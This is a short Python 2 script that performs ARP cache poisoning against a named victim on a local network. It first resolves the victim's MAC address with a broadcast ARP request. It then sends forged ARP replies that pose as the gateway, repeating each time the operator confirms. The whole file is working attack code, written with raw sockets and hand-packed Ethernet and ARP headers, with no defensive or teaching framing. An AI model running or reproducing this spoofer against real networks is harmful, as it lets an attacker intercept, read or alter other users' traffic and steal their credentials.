from socket import *
from sys import argv
import netifaces as netif# pip install netifaces
from struct import pack, unpack
from binascii import hexlify, unhexlify

ETHER_ARP_TYPE = 0x0806
HARD_TYPE = 0x0001
PROTO_TYPE = 0x0800
HARD_ADDR_LEN = 0x06
PROTO_ADDR_LEN = 0x04

def send_arp(interface, victim_mac, victim_ip,  my_ip, my_mac, gateway_ip, OPER):
    s = socket(PF_PACKET, SOCK_RAW, SOCK_RAW)
    s.bind((interface, 0))

    if OPER == "REQUEST":
        DST_MAC = '\xff\xff\xff\xff\xff\xff' ## Broadcast
        SRC_MAC = my_mac
        OPERATION = 0x0001
        SEND_HDR_ADDR = my_mac
        SEND_PROTO_ADDR = my_ip
        TARGET_HDR_ADDR = '\x00\x00\x00\x00\x00\x00' # Don't know MAC
        TARGET_PROTO_ADDR = victim_ip
    if OPER == "REPLY":
        DST_MAC = victim_mac
        SRC_MAC = my_mac
        OPERATION = 0x0002
        SEND_HDR_ADDR = my_mac
        SEND_PROTO_ADDR = gateway_ip
        TARGET_HDR_ADDR = victim_mac
        TARGET_PROTO_ADDR = victim_ip

    ether_hdr = ""
    ether_hdr += pack('!6s', DST_MAC)
    ether_hdr += pack('!6s', SRC_MAC)
    ether_hdr += pack('!H', ETHER_ARP_TYPE)
    arp_hdr = ""
    arp_hdr += pack('!H', HARD_TYPE)
    arp_hdr += pack('!H', PROTO_TYPE)
    arp_hdr += pack('!B', HARD_ADDR_LEN)
    arp_hdr += pack('!B', PROTO_ADDR_LEN)
    arp_hdr += pack('!H', OPERATION)
    arp_hdr += pack('!6s', SEND_HDR_ADDR)
    arp_hdr += pack('!4s', SEND_PROTO_ADDR)
    arp_hdr += pack('!6s', TARGET_HDR_ADDR)
    arp_hdr += pack('!4s', TARGET_PROTO_ADDR)

    s.send(ether_hdr + arp_hdr)

    if OPER == "REQUEST":
        s = socket(PF_PACKET, SOCK_RAW, ntohs(0x0806))
        s.bind((interface, 0))
        ether_hdr = s.recvfrom(65535)[0][0:14]
        ether_hdr = unpack("!6s6s2s", ether_hdr)
        victim_mac = ether_hdr[1]
        return victim_mac

def main(interface, victim_ip, gateway_ip):

    my_mac = unhexlify(''.join(netif.ifaddresses(interface)[netif.AF_LINK][0]['addr'].split(":")))
    my_ip = inet_aton(netif.ifaddresses(interface)[netif.AF_INET][0]['addr'])

    victim_mac = send_arp(interface, 0, inet_aton(victim_ip), my_ip, my_mac, 0, "REQUEST")

    flag = raw_input("Send ARP Reply to target? (Y/N): ")
    while flag == "Y":
        send_arp(interface, victim_mac, inet_aton(victim_ip), my_ip, my_mac, inet_aton(gateway_ip), "REPLY")
        flag = raw_input("Send ARP Reply to target? (Y/N): ")

if __name__ == '__main__':
    main(argv[1], argv[2], argv[3])
